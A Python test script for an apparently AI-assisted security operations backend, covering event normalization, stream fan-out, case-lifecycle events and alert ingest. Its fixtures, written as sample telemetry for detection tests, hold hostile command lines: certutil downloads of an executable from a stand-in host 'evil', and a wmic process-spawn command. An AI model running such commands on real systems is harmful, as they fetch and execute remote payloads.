"""Realtime data plane sanity checks.

Covers the four moving parts of the OCSF / stream / case-lifecycle
pipeline introduced under Theme 1 (t1-realtime-data):

  1. OCSF normalizer — every dialect (OCSF, ECS, Sysmon, unknown) lands
     on the canonical :class:`OcsfEvent` shape, and the projection into
     a flat Sigma payload preserves both OCSF-canonical keys
     (``process.name``) and the vendor aliases (``Image``).
  2. Stream fan-out — the in-memory backend delivers a published event
     to every subscriber on the same topic, isolates topics from each
     other, replays history to late joiners, and drops cleanly on
     ``unsubscribe``.
  3. Case lifecycle publishers — created / status / closed / update
     each emit a well-formed envelope on ``TOPICS.CASES_LIFECYCLE`` with
     ``kind`` set correctly and the tenant/case fields preserved.
  4. /events ingest path — a real HTTP request through the FastAPI app
     normalizes through OCSF, publishes onto ``TOPICS.EVENTS_OCSF``,
     persists the OCSF payload on the matching Alert row, and remains
     resilient when the stream publisher raises (Kafka broker outage
     simulation) — i.e. the request must still 200 and persist.

Run with:

    cd platform/backend
    PYTHONPATH=. python tests/_check_realtime.py
"""

from __future__ import annotations

import asyncio
import os
import sys
from pathlib import Path


# ── Boot env (mirror _check_events_endpoint.py) ────────────────────────
os.environ.setdefault("AISOC_DEV_ALLOW_ANON_TENANT", "true")
os.environ.setdefault("AISOC_SEED_ON_STARTUP", "false")
os.environ.setdefault("AISOC_STREAM_BACKEND", "memory")
# Make sure we don't accidentally hit a real ClickHouse cluster.
os.environ.pop("AISOC_CLICKHOUSE_URL", None)

_TMP_DB = Path(__file__).parent / "_smoke_realtime.sqlite"
if _TMP_DB.exists():
    _TMP_DB.unlink()
os.environ["AISOC_DB_PATH"] = str(_TMP_DB)

sys.path.insert(0, str(Path(__file__).parent.parent))


# ── Imports after env is fixed ─────────────────────────────────────────
from app.realtime import ocsf as ocsf_mod  # noqa: E402
from app.realtime.ocsf import (  # noqa: E402
    OcsfActivityClass,
    OcsfCategory,
    normalize_event,
    ocsf_to_sigma_payload,
)
from app.realtime import stream as stream_mod  # noqa: E402
from app.realtime.stream import (  # noqa: E402
    InMemoryStreamBackend,
    StreamBackend,
    TOPICS,
)
from app.realtime import case_events  # noqa: E402


def _assert(cond: bool, msg: str) -> None:
    if not cond:
        print(f"  FAIL: {msg}")
        sys.exit(1)
    print(f"  ok:   {msg}")


# ── 1. OCSF normalizer ─────────────────────────────────────────────────


def test_ocsf_normalizer() -> None:
    print("\n[1] OCSF normalizer covers every dialect")

    # OCSF pass-through: producer already speaks OCSF.
    oe = normalize_event(
        source="amazon-security-lake",
        event={
            "class_uid": OcsfActivityClass.PROCESS_ACTIVITY.value,
            "category_uid": OcsfCategory.SYSTEM_ACTIVITY.value,
            "activity_id": 1,
            "severity_id": 3,
            "time": "2026-05-01T12:00:00Z",
            "actor": {"user": {"name": "alice"}, "process": {"name": "powershell.exe", "pid": 4321}},
            "device": {"hostname": "WIN-01"},
            "src_endpoint": {"ip": "10.0.0.5"},
        },
    )
    _assert(oe.normalization_dialect == "ocsf", f"ocsf pass-through dialect (got {oe.normalization_dialect})")
    _assert(oe.class_uid == OcsfActivityClass.PROCESS_ACTIVITY.value, "ocsf class_uid preserved")
    _assert(oe.actor_user == "alice", f"ocsf actor_user (got {oe.actor_user})")
    _assert(oe.actor_process_name == "powershell.exe", "ocsf process name")
    _assert(oe.src_host == "WIN-01", "ocsf src_host")
    _assert(oe.src_ip == "10.0.0.5", "ocsf src_ip")

    # ECS: dotted lowercase and nested dicts both work.
    oe = normalize_event(
        source="filebeat",
        event={
            "@timestamp": "2026-05-01T12:34:56Z",
            "event": {"category": "process", "action": "started", "severity": 2},
            "process": {"name": "wmic.exe", "command_line": "wmic process call create cmd", "pid": 1234},
            "host": {"name": "host-1"},
            "user": {"name": "bob"},
        },
    )
    _assert(oe.normalization_dialect == "ecs", f"ecs dialect (got {oe.normalization_dialect})")
    _assert(oe.class_uid == OcsfActivityClass.PROCESS_ACTIVITY.value, "ecs → process activity")
    _assert(oe.actor_process_name == "wmic.exe", f"ecs process name (got {oe.actor_process_name})")
    _assert(oe.actor_process_cmdline and "wmic" in oe.actor_process_cmdline, "ecs cmdline")
    _assert(oe.actor_process_pid == 1234, "ecs pid")
    _assert(oe.src_host == "host-1", "ecs src_host")

    # Sysmon flat PascalCase.
    oe = normalize_event(
        source="windows-edr",
        event={
            "EventID": 1,
            "Image": "C:\\Windows\\System32\\certutil.exe",
            "CommandLine": "certutil -urlcache -split -f http://evil/x.exe",
            "Computer": "WIN-VICTIM",
            "ProcessId": 5566,
            "User": "victim",
            "Hashes": "MD5=ABCD,SHA256=DEADBEEFCAFE",
            "UtcTime": "2026-05-01T08:00:00Z",
        },
    )
    _assert(oe.normalization_dialect == "sysmon", f"sysmon dialect (got {oe.normalization_dialect})")
    _assert(oe.class_uid == OcsfActivityClass.PROCESS_ACTIVITY.value, "sysmon EID 1 → process activity")
    _assert(oe.actor_process_name == "certutil.exe", f"sysmon basename (got {oe.actor_process_name})")
    _assert(oe.actor_process_pid == 5566, "sysmon pid")
    _assert(oe.src_host == "WIN-VICTIM", "sysmon hostname")
    _assert(oe.file_hash == "DEADBEEFCAFE", f"sysmon sha256 hash (got {oe.file_hash})")
    _assert(oe.raw.get("Image", "").endswith("certutil.exe"), "sysmon raw payload preserved")

    # Unknown / generic vendor JSON falls back to security finding.
    oe = normalize_event(
        source="custom-vendor",
        event={"title": "Suspicious activity", "severity": 4, "hostname": "srv-9"},
    )
    _assert(oe.normalization_dialect == "unknown", f"unknown dialect (got {oe.normalization_dialect})")
    _assert(oe.class_uid == OcsfActivityClass.SECURITY_FINDING.value, "unknown → finding")
    _assert(oe.title == "Suspicious activity", "unknown title")
    _assert(oe.severity_id == 4, "unknown severity")
    _assert(oe.src_host == "srv-9", "unknown hostname")

    # Bad input must never raise.
    oe = normalize_event(source="garbage", event={"weird": object()})  # type: ignore[arg-type]
    _assert(oe.normalization_dialect in {"unknown", "error"}, "bad input doesn't raise")

    # Sigma payload projection emits both canonical and alias keys.
    oe = normalize_event(
        source="windows-edr",
        event={
            "EventID": 1,
            "Image": "C:\\Windows\\System32\\certutil.exe",
            "CommandLine": "certutil -urlcache http://evil/x.exe",
            "Computer": "HOST",
        },
    )
    payload = ocsf_to_sigma_payload(oe)
    _assert(payload.get("process.name") == "certutil.exe", "sigma payload has process.name")
    _assert(payload.get("Image") == "certutil.exe", "sigma payload has Image alias")
    _assert(payload.get("CommandLine", "").startswith("certutil"), "sigma payload has CommandLine alias")
    _assert(payload.get("EventID") == 1, "sigma payload preserves raw EventID")
    _assert("host.name" in payload and "Computer" in payload, "sigma payload has host aliases")

    # to_dict serializes the time field deterministically (ISO 8601 UTC).
    serialized = oe.to_dict()
    _assert(isinstance(serialized.get("time"), str), "to_dict time is string")
    _assert(serialized["time"].endswith("+00:00"), f"to_dict time ISO UTC (got {serialized['time']})")


# ── 2. Stream backend fan-out ──────────────────────────────────────────


async def test_stream_fanout() -> None:
    print("\n[2] InMemoryStreamBackend fan-out + topic isolation + history replay")

    bk = InMemoryStreamBackend(queue_size=16, history_size=8)

    qa = await bk.subscribe(TOPICS.EVENTS_OCSF, group="a")
    qb = await bk.subscribe(TOPICS.EVENTS_OCSF, group="b")
    qc = await bk.subscribe(TOPICS.CASES_LIFECYCLE, group="cases")

    await bk.publish(TOPICS.EVENTS_OCSF, {"hello": "world", "n": 1})
    await bk.publish(TOPICS.EVENTS_OCSF, {"hello": "world", "n": 2})
    await bk.publish(TOPICS.CASES_LIFECYCLE, {"kind": "case.created", "case_id": 42})

    msg_a1 = await asyncio.wait_for(qa.get(), timeout=1.0)
    msg_a2 = await asyncio.wait_for(qa.get(), timeout=1.0)
    msg_b1 = await asyncio.wait_for(qb.get(), timeout=1.0)
    msg_b2 = await asyncio.wait_for(qb.get(), timeout=1.0)
    msg_c1 = await asyncio.wait_for(qc.get(), timeout=1.0)

    _assert(msg_a1["n"] == 1 and msg_a2["n"] == 2, "subscriber A received both events in order")
    _assert(msg_b1["n"] == 1 and msg_b2["n"] == 2, "subscriber B received both events (fan-out)")
    _assert(msg_a1["_topic"] == TOPICS.EVENTS_OCSF, "envelope stamps _topic")
    _assert(msg_c1["case_id"] == 42, "topic isolation: cases queue gets only case event")
    _assert(qc.empty(), "events topic did not leak into cases queue")

    # Late joiner replays last N from history.
    q_late = await bk.subscribe(TOPICS.EVENTS_OCSF, group="late", history=5)
    replayed = []
    while not q_late.empty():
        replayed.append(q_late.get_nowait())
    _assert(len(replayed) == 2, f"late joiner replayed retained history (got {len(replayed)})")
    _assert(
        [m["n"] for m in replayed] == [1, 2],
        "late joiner gets messages in original order",
    )

    # Unsubscribe stops further delivery.
    await bk.unsubscribe(qa)
    await bk.publish(TOPICS.EVENTS_OCSF, {"hello": "post-unsub", "n": 3})
    msg_b3 = await asyncio.wait_for(qb.get(), timeout=1.0)
    _assert(msg_b3["n"] == 3, "subscriber B still alive after A unsubscribed")
    _assert(qa.empty(), "unsubscribed queue receives no new messages")

    # Drop-newest on full queue: producer must not block.
    tiny = InMemoryStreamBackend(queue_size=2, history_size=2)
    q_full = await tiny.subscribe("aisoc.test.tiny")
    for i in range(10):
        await tiny.publish("aisoc.test.tiny", {"i": i})
    drained = 0
    while not q_full.empty():
        q_full.get_nowait()
        drained += 1
    _assert(drained <= 2, f"full-queue overflow dropped excess (drained {drained})")


# ── 3. Case lifecycle publishers ───────────────────────────────────────


async def test_case_lifecycle() -> None:
    print("\n[3] case-lifecycle publishers emit canonical envelopes")

    # Swap in a fresh in-memory backend so we observe envelopes deterministically.
    stream_mod._reset_for_tests()
    bk = InMemoryStreamBackend()
    stream_mod._stream = bk  # type: ignore[attr-defined]

    q = await bk.subscribe(TOPICS.CASES_LIFECYCLE, group="test-cases")

    await case_events.publish_case_created(
        tenant_id="tenant-1",
        case_id=101,
        title="Suspicious certutil",
        severity="high",
        status="new",
        source="orchestrator-bootstrap",
        alert_ids=[5001],
    )
    await case_events.publish_case_status(
        tenant_id="tenant-1",
        case_id=101,
        from_status="new",
        to_status="triaging",
        actor="orchestrator",
        reason="auto-promote",
    )
    await case_events.publish_case_closed(
        tenant_id="tenant-1",
        case_id=101,
        verdict="true_positive",
        confidence=0.92,
        actor="orchestrator",
    )
    await case_events.publish_case_update(
        tenant_id="tenant-1",
        case_id=101,
        update_kind="ioc_added",
        fields={"ioc_type": "sha256", "value": "deadbeef"},
    )

    envelopes = []
    for _ in range(4):
        envelopes.append(await asyncio.wait_for(q.get(), timeout=1.0))

    kinds = [e["kind"] for e in envelopes]
    _assert(
        kinds == ["case.created", "case.status_changed", "case.closed", "case.update.ioc_added"],
        f"envelope kinds in order (got {kinds})",
    )

    created = envelopes[0]
    _assert(created["tenant_id"] == "tenant-1", "created envelope has tenant_id")
    _assert(created["case_id"] == 101, "created envelope has case_id")
    _assert(created["severity"] == "high", "created envelope has severity")
    _assert(created["alert_ids"] == [5001], "created envelope has alert_ids")
    _assert(created["source"] == "orchestrator-bootstrap", "created envelope has source")
    _assert("ts" in created and created["ts"].endswith("+00:00"), "created envelope has ISO ts")
    _assert(created["_topic"] == TOPICS.CASES_LIFECYCLE, "envelope stamped with topic")

    status = envelopes[1]
    _assert(status["from"] == "new" and status["to"] == "triaging", "status from/to fields")
    _assert(status["reason"] == "auto-promote", "status reason field")

    closed = envelopes[2]
    _assert(closed["verdict"] == "true_positive", "closed verdict")
    _assert(abs(closed["confidence"] - 0.92) < 1e-6, "closed confidence")

    update = envelopes[3]
    _assert(update["ioc_type"] == "sha256" and update["value"] == "deadbeef", "update fields merged")


# ── 4. /events ingest path: OCSF + stream + Kafka resilience ──────────
#
# Note on test plumbing: TestClient runs the ASGI app inside its own
# worker thread with its own event loop. asyncio.Queue is loop-bound, so
# subscribing from this thread and waiting on the queue from
# TestClient's loop is unsafe and racy. We sidestep this by inspecting
# ``InMemoryStreamBackend._history`` after the request — every publish
# is appended there regardless of subscribers, which is exactly what we
# need to assert.


def _install_orchestrator_stub() -> None:
    """Replace the orchestrator with a stub that only fires case.created.

    The real ``_run_orchestrator`` would invoke the LLM tool-calling graph
    which we don't want to run in a unit check (slow, non-deterministic,
    needs API keys). But the case.created publish must still happen since
    it's part of the contract this test is validating — so the stub does
    that one piece faithfully and skips the rest.
    """
    from app.api import routes as _routes
    from app.db import session_scope
    from app.models.case import Case

    async def _stub_orchestrator(case_id: int, tenant_id: str) -> None:
        with session_scope() as s:
            case = s.get(Case, case_id)
            if case is not None:
                await case_events.publish_case_created(
                    tenant_id=tenant_id,
                    case_id=case_id,
                    title=case.title,
                    severity=case.severity.value,
                    status=case.status.value,
                    source="orchestrator-bootstrap",
                )

    _routes._run_orchestrator = _stub_orchestrator  # type: ignore[attr-defined]


def _drain_history(bk: InMemoryStreamBackend, topic: str) -> list[dict]:
    """Snapshot the in-memory backend's retained history for a topic."""
    return list(bk._history.get(topic, []))


def test_events_ingest_path() -> None:
    print("\n[4] /events ingest persists OCSF on Alert and publishes onto stream")

    stream_mod._reset_for_tests()
    bk = InMemoryStreamBackend()
    stream_mod._stream = bk  # type: ignore[attr-defined]

    _install_orchestrator_stub()

    from fastapi.testclient import TestClient
    from app.main import app
    from app.db import get_session
    from app.models.alert import Alert

    with TestClient(app) as client:
        r = client.post(
            "/events",
            json={
                "source": "windows-edr",
                "external_id": "evt-rt-0001",
                "event": {
                    "process": {
                        "name": "C:\\Windows\\System32\\certutil.exe",
                        "command_line": "certutil.exe -urlcache -split -f http://evil/x.exe x.exe",
                    },
                    "user": {"name": "victim"},
                    "host": {"name": "WIN-VICTIM-01"},
                },
            },
        )
        _assert(r.status_code == 200, f"ingest returns 200 (got {r.status_code}: {r.text[:200]})")
        body = r.json()
        _assert(body["hits"] >= 1, f"ingest fires at least one hit (got {body})")
        first_alert_id = body["alert_ids"][0]

        # OCSF stream publish — inspect history rather than subscribe.
        ocsf_events = _drain_history(bk, TOPICS.EVENTS_OCSF)
        _assert(len(ocsf_events) >= 1, f"at least one OCSF event published (got {len(ocsf_events)})")
        ocsf_envelope = ocsf_events[-1]
        _assert(ocsf_envelope["_topic"] == TOPICS.EVENTS_OCSF, "OCSF envelope stamped with topic")
        _assert(
            ocsf_envelope.get("normalization_dialect") in {"ecs", "ocsf", "sysmon", "unknown"},
            f"OCSF envelope carries dialect (got {ocsf_envelope.get('normalization_dialect')!r})",
        )
        _assert("tenant_id" in ocsf_envelope, "OCSF envelope carries tenant_id")
        proc = ocsf_envelope.get("actor_process_name") or ""
        _assert(
            proc.endswith("certutil.exe") or proc == "certutil.exe",
            f"OCSF envelope has actor_process_name (got {proc!r})",
        )

        # Case lifecycle publish should have fired from the orchestrator stub.
        case_events_history = _drain_history(bk, TOPICS.CASES_LIFECYCLE)
        _assert(len(case_events_history) >= 1, "at least one case.created event fired")
        case_envelope = case_events_history[-1]
        _assert(
            case_envelope["kind"] == "case.created",
            f"case.created event fired (got kind={case_envelope.get('kind')!r})",
        )
        _assert(case_envelope["case_id"] == body["case_ids"][0], "case envelope case_id matches body")
        _assert(case_envelope.get("tenant_id"), "case envelope carries tenant_id")

        # Persisted Alert must carry the OCSF payload under raw["ocsf"].
        with next(get_session()) as session:
            alert = session.get(Alert, first_alert_id)
            _assert(alert is not None, f"alert {first_alert_id} exists")
            assert alert is not None
            _assert("ocsf" in alert.raw, "alert.raw['ocsf'] persisted")
            ocsf_payload = alert.raw["ocsf"]
            _assert(isinstance(ocsf_payload, dict), "alert.raw['ocsf'] is dict")
            _assert(
                ocsf_payload.get("normalization_dialect") in {"ecs", "ocsf", "sysmon", "unknown"},
                f"alert ocsf payload has dialect (got {ocsf_payload.get('normalization_dialect')!r})",
            )
            _assert(
                "time" in ocsf_payload and isinstance(ocsf_payload["time"], str),
                "alert ocsf payload time is ISO string",
            )


def test_events_ingest_resilient_to_publish_failure() -> None:
    print("\n[5] /events ingest stays 200 even if stream.publish raises (Kafka outage sim)")

    # Force a broken stream — every publish raises. The ingest path is
    # supposed to swallow stream errors so a broker outage doesn't take
    # down detection.
    class _BrokenStream(StreamBackend):
        name = "broken"

        async def publish(self, topic, payload):  # type: ignore[override]
            raise RuntimeError("simulated kafka broker outage")

        async def subscribe(self, topic, *, group="default", history=0):  # type: ignore[override]
            raise RuntimeError("broken")

        async def unsubscribe(self, q):  # type: ignore[override]
            return None

    stream_mod._reset_for_tests()
    stream_mod._stream = _BrokenStream()  # type: ignore[attr-defined]

    # Use a noop orchestrator here — the point of this test is whether
    # the request path itself survives a stream outage. The orchestrator
    # is a background task and tested elsewhere.
    from app.api import routes as _routes

    async def _noop_orchestrator(case_id: int, tenant_id: str) -> None:  # noqa: ARG001
        return None

    _routes._run_orchestrator = _noop_orchestrator  # type: ignore[attr-defined]

    from fastapi.testclient import TestClient
    from app.main import app
    from app.db import get_session
    from app.models.alert import Alert

    with TestClient(app) as client:
        r = client.post(
            "/events",
            json={
                "source": "windows-edr",
                "external_id": "evt-rt-broken-0001",
                "event": {
                    "process": {
                        "name": "C:\\Windows\\System32\\certutil.exe",
                        "command_line": "certutil -urlcache https://evil/payload",
                    },
                    "host": {"name": "WIN-X"},
                },
            },
        )
        _assert(
            r.status_code == 200,
            f"ingest survives broken stream (got {r.status_code}: {r.text[:200]})",
        )
        body = r.json()
        _assert(body["hits"] >= 1, "detection still fires with broken stream")
        # Persisted alert with OCSF — proves the detection path didn't bail
        # when the broker died.
        with next(get_session()) as session:
            alert = session.get(Alert, body["alert_ids"][0])
            _assert(alert is not None, "alert persisted despite broken stream")
            assert alert is not None
            _assert("ocsf" in alert.raw, "OCSF payload persisted despite broken stream")

    # Clean up: reset the singleton so later tests in the same run get a
    # fresh backend.
    stream_mod._reset_for_tests()


# ── Driver ─────────────────────────────────────────────────────────────


def main() -> int:
    print("=" * 70)
    print("smoke test: realtime data plane (OCSF + stream + case events + ingest)")
    print("=" * 70)

    test_ocsf_normalizer()

    asyncio.run(test_stream_fanout())
    asyncio.run(test_case_lifecycle())

    test_events_ingest_path()
    test_events_ingest_resilient_to_publish_failure()

    print("\n" + "=" * 70)
    print("PASS — realtime data plane checks all green")
    print("=" * 70)
    return 0


if __name__ == "__main__":
    try:
        sys.exit(main())
    finally:
        if _TMP_DB.exists():
            _TMP_DB.unlink()
